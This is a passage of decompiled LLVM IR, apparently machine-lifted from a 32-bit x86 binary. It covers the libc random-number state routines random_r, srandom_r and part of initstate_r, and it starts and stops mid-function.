  %v2_804b233 = inttoptr i32 %v1_804b233 to i32*
  %v3_804b233 = load i32, i32* %v2_804b233, align 4
  store i32 %v3_804b233, i32* %ecx.global-to-local, align 4
  %v1_804b236 = add i32 %arg1, 4
  store i32 %v1_804b236, i32* %esi.global-to-local, align 4
  %v1_804b239 = add i32 %tmp3, 8
  %v2_804b239 = inttoptr i32 %v1_804b239 to i32*
  %v3_804b239 = load i32, i32* %v2_804b239, align 4
  %v1_804b23c = icmp eq i32 %v3_804b233, 0
  %v1_804b23e = icmp eq i1 %v1_804b23c, false
  br i1 %v1_804b23e, label %dec_label_pc_804b249, label %dec_label_pc_804b240

dec_label_pc_804b240:                             ; preds = %entry
  %v1_804b240 = add i32 %v3_804b239, -4
  %v2_804b240 = inttoptr i32 %v1_804b240 to i32*
  store i32 0, i32* %v2_804b240, align 4
  br label %dec_label_pc_804b259

dec_label_pc_804b249:                             ; preds = %entry
  %v1_804b249 = add i32 %tmp3, 4
  %v2_804b249 = inttoptr i32 %v1_804b249 to i32*
  %v3_804b249 = load i32, i32* %v2_804b249, align 4
  %v2_804b24c = sub i32 %v3_804b249, %v3_804b239
  %v2_804b24e = sdiv i32 %v2_804b24c, 4
  %v3_804b251 = mul i32 %v2_804b24e, 5
  %v2_804b254 = add i32 %v3_804b251, %v3_804b233
  store i32 %v2_804b254, i32* %eax.global-to-local, align 4
  %v2_804b256 = add i32 %v3_804b239, -4
  %v3_804b256 = inttoptr i32 %v2_804b256 to i32*
  store i32 %v2_804b254, i32* %v3_804b256, align 4
  br label %dec_label_pc_804b259

dec_label_pc_804b259:                             ; preds = %dec_label_pc_804b240, %dec_label_pc_804b249
  %v0_804b259 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b259 = add i32 %v0_804b259, -4
  %v2_804b259 = inttoptr i32 %v1_804b259 to i32*
  %v3_804b259 = load i32, i32* %v2_804b259, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804b261 = ashr i32 %v3_804b259, 31
  %v2_804b262 = zext i32 %v3_804b259 to i64
  %v4_804b262 = zext i32 %v1_804b261 to i64
  %v5_804b262 = mul nuw i64 %v4_804b262, 4294967296
  %v6_804b262 = or i64 %v5_804b262, %v2_804b262
  %v8_804b262 = sdiv i64 %v6_804b262, 5
  %v9_804b262 = trunc i64 %v8_804b262 to i32
  store i32 %v9_804b262, i32* %eax.global-to-local, align 4
  %v10_804b262 = srem i64 %v6_804b262, 5
  %v11_804b262 = trunc i64 %v10_804b262 to i32
  %v6_804b267 = icmp ugt i32 %v11_804b262, 4
  br i1 %v6_804b267, label %dec_label_pc_804b2a7, label %dec_label_pc_804b269

dec_label_pc_804b269:                             ; preds = %dec_label_pc_804b259
  %v1_804b269 = mul i32 %v11_804b262, 4
  %v2_804b269 = add i32 %v1_804b269, ptrtoint (i32* @global_var_8050594.64 to i32)
  %v3_804b269 = inttoptr i32 %v2_804b269 to i32*
  %v4_804b269 = load i32, i32* %v3_804b269, align 4
  store i32 %v4_804b269, i32* %ecx.global-to-local, align 4
  %v1_804b270 = icmp eq i32 %v11_804b262, 0
  %v2_804b272 = add i32 %v1_804b269, ptrtoint (i32* @global_var_8050580.65 to i32)
  %v3_804b272 = inttoptr i32 %v2_804b272 to i32*
  %v4_804b272 = load i32, i32* %v3_804b272, align 4
  store i32 %v4_804b272, i32* %ebp.global-to-local, align 4
  %v1_804b279 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b279 = add i32 %v1_804b279, 12
  %v3_804b279 = inttoptr i32 %v2_804b279 to i32*
  store i32 %v11_804b262, i32* %v3_804b279, align 4
  %v0_804b27c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b27c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b27c = add i32 %v1_804b27c, 16
  %v3_804b27c = inttoptr i32 %v2_804b27c to i32*
  store i32 %v0_804b27c, i32* %v3_804b27c, align 4
  %v0_804b27f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804b27f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b27f = add i32 %v1_804b27f, 20
  %v3_804b27f = inttoptr i32 %v2_804b27f to i32*
  store i32 %v0_804b27f, i32* %v3_804b27f, align 4
  br i1 %v1_804b270, label %dec_label_pc_804b29a, label %dec_label_pc_804b284

dec_label_pc_804b284:                             ; preds = %dec_label_pc_804b269
  %v0_804b284 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b284 = add i32 %v0_804b284, -4
  %v2_804b284 = inttoptr i32 %v1_804b284 to i32*
  %v3_804b284 = load i32, i32* %v2_804b284, align 4
  %v1_804b287 = ashr i32 %v3_804b284, 31
  %v0_804b288 = load i32, i32* %edi.global-to-local, align 4
  %v2_804b288 = zext i32 %v3_804b284 to i64
  %v4_804b288 = zext i32 %v1_804b287 to i64
  %v5_804b288 = mul nuw i64 %v4_804b288, 4294967296
  %v6_804b288 = or i64 %v5_804b288, %v2_804b288
  %v7_804b288 = zext i32 %v0_804b288 to i64
  %v8_804b288 = sdiv i64 %v6_804b288, %v7_804b288
  %v9_804b288 = trunc i64 %v8_804b288 to i32
  %v2_804b28a = mul i32 %v9_804b288, 4
  %v3_804b28a = add i32 %v2_804b28a, %v0_804b284
  %v1_804b28d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b28d = add i32 %v1_804b28d, %v9_804b288
  store i32 %v2_804b28d, i32* %eax.global-to-local, align 4
  %v1_804b28f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b28f = add i32 %v1_804b28f, 4
  %v3_804b28f = inttoptr i32 %v2_804b28f to i32*
  store i32 %v3_804b28a, i32* %v3_804b28f, align 4
  %v0_804b292 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b292 = ashr i32 %v0_804b292, 31
  %v0_804b293 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b293 = zext i32 %v0_804b292 to i64
  %v4_804b293 = zext i32 %v1_804b292 to i64
  %v5_804b293 = mul nuw i64 %v4_804b293, 4294967296
  %v6_804b293 = or i64 %v5_804b293, %v2_804b293
  %v7_804b293 = zext i32 %v0_804b293 to i64
  %v8_804b293 = sdiv i64 %v6_804b293, %v7_804b293
  %v9_804b293 = trunc i64 %v8_804b293 to i32
  store i32 %v9_804b293, i32* %eax.global-to-local, align 4
  %v10_804b293 = srem i64 %v6_804b293, %v7_804b293
  %v11_804b293 = trunc i64 %v10_804b293 to i32
  %v0_804b295 = load i32, i32* %esi.global-to-local, align 4
  %v2_804b295 = mul i32 %v11_804b293, 4
  %v3_804b295 = add i32 %v2_804b295, %v0_804b295
  %v1_804b298 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b298 = inttoptr i32 %v1_804b298 to i32*
  store i32 %v3_804b295, i32* %v2_804b298, align 4
  br label %dec_label_pc_804b29a

dec_label_pc_804b29a:                             ; preds = %dec_label_pc_804b269, %dec_label_pc_804b284
  %v0_804b29a = load i32, i32* %esi.global-to-local, align 4
  %v1_804b29a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b29a = mul i32 %v1_804b29a, 4
  %v3_804b29a = add i32 %v2_804b29a, %v0_804b29a
  %v1_804b29d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b29d = add i32 %v1_804b29d, 24
  %v3_804b29d = inttoptr i32 %v2_804b29d to i32*
  store i32 %v3_804b29a, i32* %v3_804b29d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b2a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b2a2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b2a2 = add i32 %v1_804b2a2, 8
  %v3_804b2a2 = inttoptr i32 %v2_804b2a2 to i32*
  store i32 %v0_804b2a2, i32* %v3_804b2a2, align 4
  %v0_804b2bc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b2b5

dec_label_pc_804b2a7:                             ; preds = %dec_label_pc_804b259
  %v1_804b2a7 = call i32 @__errno_location(i32 %v0_804b227)
  %v1_804b2ac = inttoptr i32 %v1_804b2a7 to i32*
  store i32 22, i32* %v1_804b2ac, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b2b5

dec_label_pc_804b2b5:                             ; preds = %dec_label_pc_804b29a, %dec_label_pc_804b2a7
  %v0_804b2bc = phi i32 [ %v0_804b2bc.pre, %dec_label_pc_804b29a ], [ -1, %dec_label_pc_804b2a7 ]
  store i32 %v0_804b227, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b2bc

; uselistorder directives
  uselistorder i32 %v11_804b262, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b2b5, { 1, 0 }
  uselistorder label %dec_label_pc_804b29a, { 1, 0 }
  uselistorder label %dec_label_pc_804b259, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804b2c0 = load i32, i32* @ebx, align 4
  store i32 %v0_804b2c0, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804b2c9 = add i32 %tmp3, 12
  %v2_804b2c9 = inttoptr i32 %v1_804b2c9 to i32*
  %v3_804b2c9 = load i32, i32* %v2_804b2c9, align 4
  %v4_804b2c9 = icmp eq i32 %v3_804b2c9, 0
  %v1_804b2cd = add i32 %tmp3, 8
  %v2_804b2cd = inttoptr i32 %v1_804b2cd to i32*
  %v3_804b2cd = load i32, i32* %v2_804b2cd, align 4
  store i32 %v3_804b2cd, i32* %esi.global-to-local, align 4
  %v1_804b2d0 = icmp eq i1 %v4_804b2c9, false
  br i1 %v1_804b2d0, label %dec_label_pc_804b2e9, label %dec_label_pc_804b2d2

dec_label_pc_804b2d2:                             ; preds = %entry
  %v2_804b2d2 = inttoptr i32 %v3_804b2cd to i32*
  %v3_804b2d2 = load i32, i32* %v2_804b2d2, align 4
  %v5_804b2d2 = mul i32 %v3_804b2d2, 1103515245
  %v1_804b2d8 = add i32 %v5_804b2d2, 12345
  %v1_804b2dd = urem i32 %v1_804b2d8, -2147483648
  store i32 %v1_804b2dd, i32* %eax.global-to-local, align 4
  store i32 %v1_804b2dd, i32* %v2_804b2d2, align 4
  %v0_804b2e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b2e4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b2e4 = inttoptr i32 %v1_804b2e4 to i32*
  store i32 %v0_804b2e4, i32* %v2_804b2e4, align 4
  br label %dec_label_pc_804b314

dec_label_pc_804b2e9:                             ; preds = %entry
  %v1_804b2e9 = add i32 %tmp3, 4
  %v2_804b2e9 = inttoptr i32 %v1_804b2e9 to i32*
  %v3_804b2e9 = load i32, i32* %v2_804b2e9, align 4
  store i32 %v3_804b2e9, i32* %ecx.global-to-local, align 4
  %v2_804b2ec = load i32, i32* %arg1, align 4
  store i32 %v2_804b2ec, i32* %edx.global-to-local, align 4
  %v1_804b2ee = add i32 %tmp3, 24
  %v2_804b2ee = inttoptr i32 %v1_804b2ee to i32*
  %v3_804b2ee = load i32, i32* %v2_804b2ee, align 4
  store i32 %v3_804b2ee, i32* %edi.global-to-local, align 4
  %v1_804b2f1 = inttoptr i32 %v3_804b2e9 to i32*
  %v2_804b2f1 = load i32, i32* %v1_804b2f1, align 4
  store i32 %v2_804b2f1, i32* %eax.global-to-local, align 4
  %v1_804b2f3 = inttoptr i32 %v2_804b2ec to i32*
  %v2_804b2f3 = load i32, i32* %v1_804b2f3, align 4
  %v4_804b2f3 = add i32 %v2_804b2f3, %v2_804b2f1
  store i32 %v4_804b2f3, i32* %v1_804b2f3, align 4
  %v0_804b2f5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b2f5 = inttoptr i32 %v0_804b2f5 to i32*
  %v2_804b2f5 = load i32, i32* %v1_804b2f5, align 4
  %v1_804b2f7 = add i32 %v0_804b2f5, 4
  store i32 %v1_804b2f7, i32* %edx.global-to-local, align 4
  %v2_804b2fa = udiv i32 %v2_804b2f5, 2
  %v1_804b2fc = load i32, i32* %edi.global-to-local, align 4
  %v7_804b2fc = icmp ult i32 %v1_804b2f7, %v1_804b2fc
  %v1_804b2fe = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b2fe = inttoptr i32 %v1_804b2fe to i32*
  store i32 %v2_804b2fa, i32* %v2_804b2fe, align 4
  %v0_804b301 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b301 = add i32 %v0_804b301, 4
  store i32 %v1_804b301, i32* %eax.global-to-local, align 4
  br i1 %v7_804b2fc, label %dec_label_pc_804b30a, label %dec_label_pc_804b306

dec_label_pc_804b306:                             ; preds = %dec_label_pc_804b2e9
  %v0_804b306 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804b306, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b30f

dec_label_pc_804b30a:                             ; preds = %dec_label_pc_804b2e9
  %v1_804b30a = load i32, i32* %edi.global-to-local, align 4
  %v7_804b30a = icmp ult i32 %v1_804b301, %v1_804b30a
  %v1_804b30c = icmp eq i1 %v7_804b30a, false
  %v3_804b30c = load i32, i32* %esi.global-to-local, align 4
  %v4_804b30c = select i1 %v1_804b30c, i32 %v3_804b30c, i32 %v1_804b301
  store i32 %v4_804b30c, i32* %eax.global-to-local, align 4
  %v0_804b30f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b30f

dec_label_pc_804b30f:                             ; preds = %dec_label_pc_804b306, %dec_label_pc_804b30a
  %v0_804b30f = phi i32 [ %v0_804b306, %dec_label_pc_804b306 ], [ %v0_804b30f.pre, %dec_label_pc_804b30a ]
  %v1_804b30f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b30f = inttoptr i32 %v1_804b30f to i32*
  store i32 %v0_804b30f, i32* %v2_804b30f, align 4
  %v0_804b311 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b311 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b311 = add i32 %v1_804b311, 4
  %v3_804b311 = inttoptr i32 %v2_804b311 to i32*
  store i32 %v0_804b311, i32* %v3_804b311, align 4
  br label %dec_label_pc_804b314

dec_label_pc_804b314:                             ; preds = %dec_label_pc_804b2d2, %dec_label_pc_804b30f
  %v2_804b314 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b314, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804b2dd, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b314, { 1, 0 }
  uselistorder label %dec_label_pc_804b30f, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804b31b = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804b31f = load i32, i32* @edi, align 4
  %v0_804b320 = load i32, i32* @esi, align 4
  %v0_804b321 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804b32d = add i32 %tmp14, 12
  %v2_804b32d = inttoptr i32 %v1_804b32d to i32*
  %v3_804b32d = load i32, i32* %v2_804b32d, align 4
  store i32 %v3_804b32d, i32* %ecx.global-to-local, align 4
  %v6_804b333 = icmp ugt i32 %v3_804b32d, 4
  br i1 %v6_804b333, label %dec_label_pc_804b3ad, label %dec_label_pc_804b335

dec_label_pc_804b335:                             ; preds = %entry
  %v1_804b335 = add i32 %tmp14, 8
  %v2_804b335 = inttoptr i32 %v1_804b335 to i32*
  %v3_804b335 = load i32, i32* %v2_804b335, align 4
  store i32 %v3_804b335, i32* %ebx.global-to-local, align 4
  %v1_804b338 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_804b33f = select i1 %v1_804b338, i32 1, i32 %arg1
  store i32 %v3_804b33f, i32* %edx.global-to-local, align 4
  %v1_804b342 = icmp eq i32 %v3_804b32d, 0
  %v2_804b344 = inttoptr i32 %v3_804b335 to i32*
  store i32 %v3_804b33f, i32* %v2_804b344, align 4
  br i1 %v1_804b342, label %dec_label_pc_804b3ab, label %dec_label_pc_804b348

dec_label_pc_804b348:                             ; preds = %dec_label_pc_804b335
  %v0_804b348 = load i32, i32* @esi, align 4
  %v1_804b348 = add i32 %v0_804b348, 16
  %v2_804b348 = inttoptr i32 %v1_804b348 to i32*
  %v3_804b348 = load i32, i32* %v2_804b348, align 4
  store i32 %v3_804b348, i32* %eax.global-to-local, align 4
  %v0_804b34b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b34b, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_804b352 = sext i32 %v3_804b348 to i64
  store i64 %v4_804b352, i64* %stack_var_-40, align 8
  %v5_804b38829 = icmp sgt i32 %v3_804b348, 1
  br i1 %v5_804b38829, label %dec_label_pc_804b357, label %dec_label_pc_804b38a

dec_label_pc_804b357:                             ; preds = %dec_label_pc_804b348, %dec_label_pc_804b357.dec_label_pc_804b357_crit_edge
  %v0_804b37f = phi i32 [ %v0_804b37f.pre, %dec_label_pc_804b357.dec_label_pc_804b357_crit_edge ], [ %v0_804b34b, %dec_label_pc_804b348 ]
  %v0_804b357 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b35e = ashr i32 %v0_804b357, 31
  %v2_804b35f = zext i32 %v0_804b357 to i64
  %v4_804b35f = zext i32 %v1_804b35e to i64
  %v5_804b35f = mul nuw i64 %v4_804b35f, 4294967296
  %v6_804b35f = or i64 %v5_804b35f, %v2_804b35f
  %v8_804b35f = sdiv i64 %v6_804b35f, 127773
  %v9_804b35f = trunc i64 %v8_804b35f to i32
  %v10_804b35f = srem i64 %v6_804b35f, 127773
  %v3_804b365 = mul nsw i64 %v10_804b35f, 16807
  %v4_804b365 = trunc i64 %v3_804b365 to i32
  %tmp24 = mul i32 %v9_804b35f, -2836
  %v2_804b371 = add i32 %v4_804b365, %tmp24
  %v1_804b373 = add i32 %v2_804b371, 1
  %v6_804b373 = xor i32 %v2_804b371, -2147483648
  %v7_804b373 = xor i32 %v1_804b373, %v2_804b371
  %v8_804b373 = and i32 %v7_804b373, %v6_804b373
  %v9_804b373 = icmp slt i32 %v8_804b373, 0
  %v10_804b373 = icmp eq i32 %v1_804b373, 0
  %v11_804b373 = icmp slt i32 %v1_804b373, 0
  %v1_804b376 = add i32 %v2_804b371, 2147483647
  store i32 %v1_804b376, i32* %eax.global-to-local, align 4
  %v3_804b37c = icmp ne i1 %v11_804b373, %v9_804b373
  %v4_804b37c = or i1 %v10_804b373, %v3_804b37c
  %v7_804b37c = select i1 %v4_804b37c, i32 %v1_804b376, i32 %v2_804b371
  store i32 %v7_804b37c, i32* %edx.global-to-local, align 4
  %v1_804b37f = add i32 %v0_804b37f, 4
  store i32 %v1_804b37f, i32* %ecx.global-to-local, align 4
  %v2_804b382 = inttoptr i32 %v1_804b37f to i32*
  store i32 %v7_804b37c, i32* %v2_804b382, align 4
  %v0_804b384 = load i32, i32* @edi, align 4
  %v1_804b384 = add i32 %v0_804b384, 1
  store i32 %v1_804b384, i32* @edi, align 4
  %v3_804b385.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_804b385.pre to i32
  %v5_804b388 = icmp slt i32 %v1_804b384, %extract.t11
  br i1 %v5_804b388, label %dec_label_pc_804b357.dec_label_pc_804b357_crit_edge, label %dec_label_pc_804b385.dec_label_pc_804b38a_crit_edge

dec_label_pc_804b357.dec_label_pc_804b357_crit_edge: ; preds = %dec_label_pc_804b357
  %v0_804b37f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b357

dec_label_pc_804b385.dec_label_pc_804b38a_crit_edge: ; preds = %dec_label_pc_804b357
  %v0_804b38a.pre = load i32, i32* @esi, align 4
  %v0_804b38d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b38a

dec_label_pc_804b38a:                             ; preds = %dec_label_pc_804b385.dec_label_pc_804b38a_crit_edge, %dec_label_pc_804b348
  %v0_804b38d = phi i32 [ %v0_804b38d.pre, %dec_label_pc_804b385.dec_label_pc_804b38a_crit_edge ], [ %v0_804b34b, %dec_label_pc_804b348 ]
  %v0_804b38a = phi i32 [ %v0_804b38a.pre, %dec_label_pc_804b385.dec_label_pc_804b38a_crit_edge ], [ %v0_804b348, %dec_label_pc_804b348 ]
  %v1_804b38a = add i32 %v0_804b38a, 20
  %v2_804b38a = inttoptr i32 %v1_804b38a to i32*
  %v3_804b38a = load i32, i32* %v2_804b38a, align 4
  store i32 %v3_804b38a, i32* %eax.global-to-local, align 4
  %v2_804b38d = add i32 %v0_804b38a, 4
  %v3_804b38d = inttoptr i32 %v2_804b38d to i32*
  store i32 %v0_804b38d, i32* %v3_804b38d, align 4
  %v0_804b390 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b390 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b390 = mul i32 %v1_804b390, 4
  %v3_804b390 = add i32 %v2_804b390, %v0_804b390
  store i32 %v3_804b390, i32* %eax.global-to-local, align 4
  %v1_804b393 = load i32, i32* @esi, align 4
  %v2_804b393 = inttoptr i32 %v1_804b393 to i32*
  store i32 %v3_804b390, i32* %v2_804b393, align 4
  %v3_804b395 = load i64, i64* %stack_var_-40, align 8
  %v6_804b395 = mul nsw i64 %v3_804b395, 10
  %v7_804b395 = trunc i64 %v6_804b395 to i32
  %v2_804b39b = ptrtoint i32* %stack_var_-20 to i32
  %v1_804b3a825 = add i32 %v7_804b395, -1
  %v9_804b3a826 = icmp slt i32 %v1_804b3a825, 0
  store i32 %v1_804b3a825, i32* @ebx, align 4
  %v1_804b3a927 = icmp eq i1 %v9_804b3a826, false
  br i1 %v1_804b3a927, label %dec_label_pc_804b39b, label %dec_label_pc_804b3ab

dec_label_pc_804b39b:                             ; preds = %dec_label_pc_804b38a, %dec_label_pc_804b39b
  store i32 %v2_804b39b, i32* %eax.global-to-local, align 4
  %v0_804b3a0 = load i32, i32* @esi, align 4
  %v2_804b3a1 = inttoptr i32 %v0_804b3a0 to i32*
  %v3_804b3a1 = call i32 @__GI_random_r(i32* %v2_804b3a1, i32 %v2_804b39b)
  store i32 %v0_804b3a0, i32* %eax.global-to-local, align 4
  store i32 %v2_804b39b, i32* %edx.global-to-local, align 4
  %v0_804b3a8.pre = load i32, i32* @ebx, align 4
  %v1_804b3a8 = add i32 %v0_804b3a8.pre, -1
  %v9_804b3a8 = icmp slt i32 %v1_804b3a8, 0
  store i32 %v1_804b3a8, i32* @ebx, align 4
  %v1_804b3a9 = icmp eq i1 %v9_804b3a8, false
  br i1 %v1_804b3a9, label %dec_label_pc_804b39b, label %dec_label_pc_804b3ab

dec_label_pc_804b3ab:                             ; preds = %dec_label_pc_804b38a, %dec_label_pc_804b39b, %dec_label_pc_804b335
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3ad

dec_label_pc_804b3ad:                             ; preds = %entry, %dec_label_pc_804b3ab
  %v0_804b3b4 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804b3ab ]
  store i32 %v0_804b321, i32* @ebx, align 4
  store i32 %v0_804b320, i32* @esi, align 4
  store i32 %v0_804b31f, i32* @edi, align 4
  store i32 %v0_804b31b, i32* @ebp, align 4
  ret i32 %v0_804b3b4

; uselistorder directives
  uselistorder i32 %v1_804b3a8, { 1, 0 }
  uselistorder i32 %v0_804b38a, { 1, 0 }
  uselistorder i32 %v1_804b373, { 2, 1, 0 }
  uselistorder i32 %v2_804b371, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_804b34b, { 1, 0, 2 }
  uselistorder i32 %v3_804b32d, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_804b3ad, { 1, 0 }
  uselistorder label %dec_label_pc_804b3ab, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b39b, { 1, 0 }
  uselistorder label %dec_label_pc_804b357, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804b3b7 = load i32, i32* @esi, align 4
  %v0_804b3b8 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_804b3d9, label %dec_label_pc_804b3cd

dec_label_pc_804b3cd:                             ; preds = %entry
  %v2_804b3cd = icmp ult i32 %arg3, 256
  %v1_804b3d4 = select i1 %v2_804b3cd, i32 5, i32 4
  store i32 %v1_804b3d4, i32* @ebx, align 4
  br label %dec_label_pc_804b3ef

dec_label_pc_804b3d9:                             ; preds = %entry
  %v6_804b3dc = icmp ugt i32 %arg3, 31
  br i1 %v6_804b3dc, label %dec_label_pc_804b3e7, label %dec_label_pc_804b3de

dec_label_pc_804b3de:                             ; preds = %dec_label_pc_804b3d9
  store i32 0, i32* @ebx, align 4
  %v6_804b3e3 = icmp ugt i32 %arg3, 7
  br i1 %v6_804b3e3, label %dec_label_pc_804b3ef, label %dec_label_pc_804b43f

dec_label_pc_804b3e7:                             ; preds = %dec_label_pc_804b3d9
  %v2_804b3e7 = icmp ult i32 %arg3, 64
  %v1_804b3ec = select i1 %v2_804b3e7, i32 3, i32 2
  store i32 %v1_804b3ec, i32* @ebx, align 4
  br label %dec_label_pc_804b3ef

dec_label_pc_804b3ef:                             ; preds = %dec_label_pc_804b3de, %dec_label_pc_804b3cd, %dec_label_pc_804b3e7
  %v0_804b3f9 = phi i32 [ 0, %dec_label_pc_804b3de ], [ %v1_804b3d4, %dec_label_pc_804b3cd ], [ %v1_804b3ec, %dec_label_pc_804b3e7 ]
  %v1_804b3ef = mul nuw nsw i32 %v0_804b3f9, 4
  %v2_804b3ef = add i32 %v1_804b3ef, ptrtoint (i32* @global_var_8050594.64 to i32)
  %v3_804b3ef = inttoptr i32 %v2_804b3ef to i32*
  %v4_804b3ef = load i32, i32* %v3_804b3ef, align 4
  store i32 %v4_804b3ef, i32* %eax.global-to-local, align 4
  %v1_804b3f6 = add i32 %tmp7, 4
  store i32 %v1_804b3f6, i32* @esi, align 4
  %v2_804b3f9 = add i32 %v1_804b3ef, ptrtoint (i32* @global_var_8050580.65 to i32)
  %v3_804b3f9 = inttoptr i32 %v2_804b3f9 to i32*
  %v4_804b3f9 = load i32, i32* %v3_804b3f9, align 4
  store i32 %v4_804b3f9, i32* %edx.global-to-local, align 4
  %v2_804b400 = add i32 %arg4, 12
  %v3_804b400 = inttoptr i32 %v2_804b400 to i32*
  store i32 %v0_804b3f9, i32* %v3_804b400, align 4
  %v0_804b403 = load i32, i32* @esi, align 4
  %v1_804b403 = load i32, i32* @edi, align 4
  %v2_804b403 = add i32 %v1_804b403, 8
  %v3_804b403 = inttoptr i32 %v2_804b403 to i32*
  store i32 %v0_804b403, i32* %v3_804b403, align 4
  %v0_804b406 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b406 = load i32, i32* @edi, align 4
  %v2_804b406 = add i32 %v1_804b406, 16
  %v3_804b406 = inttoptr i32 %v2_804b406 to i32*
  store i32 %v0_804b406, i32* %v3_804b406, align 4
  %v0_804b409 = load i32, i32* @esi, align 4
  %v1_804b409 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b409 = mul i32 %v1_804b409, 4
  %v3_804b409 = add i32 %v2_804b409, %v0_804b409
  store i32 %v3_804b409, i32* %eax.global-to-local, align 4
  %v0_804b40c = load i32, i32* %edx.global-to-local, align 4
  %v1_804b40c = load i32, i32* @edi, align 4
  %v2_804b40c = add i32 %v1_804b40c, 20
  %v3_804b40c = inttoptr i32 %v2_804b40c to i32*
  store i32 %v0_804b40c, i32* %v3_804b40c, align 4
  %v0_804b40f = load i32, i32* %eax.global-to-local, align 4
  %v1_804b40f = load i32, i32* @edi, align 4
  %v2_804b40f = add i32 %v1_804b40f, 24
  %v3_804b40f = inttoptr i32 %v2_804b40f to i32*
  store i32 %v0_804b40f, i32* %v3_804b40f, align 4
  %v0_804b412 = load i32, i32* @edi, align 4
